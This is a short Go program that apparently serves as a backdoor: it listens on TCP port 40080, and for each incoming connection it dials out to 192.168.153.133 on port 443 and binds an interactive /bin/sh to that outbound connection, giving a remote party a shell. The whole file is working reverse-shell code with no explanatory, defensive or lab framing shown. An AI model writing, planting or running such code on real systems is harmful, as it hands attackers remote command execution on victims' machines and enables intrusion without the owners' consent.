package main

import (
	"log"
	"net"
	"os/exec"
)

const (
	CONN_HOST = "192.168.153.133"
	CONN_PORT = "443"
	CONN_TYPE = "tcp"
)

func handle(conn net.Conn) {

	revConn, err := net.Dial(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	if err != nil {
		log.Fatalln(err)
	}
	defer revConn.Close()

	shell := exec.Command("/bin/sh", "-i")

	shell.Stderr = revConn
	shell.Stdin = revConn
	shell.Stdout = revConn

	conn.Close()
	shell.Run()
}

func main() {
	listener, err := net.Listen("tcp", ":40080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
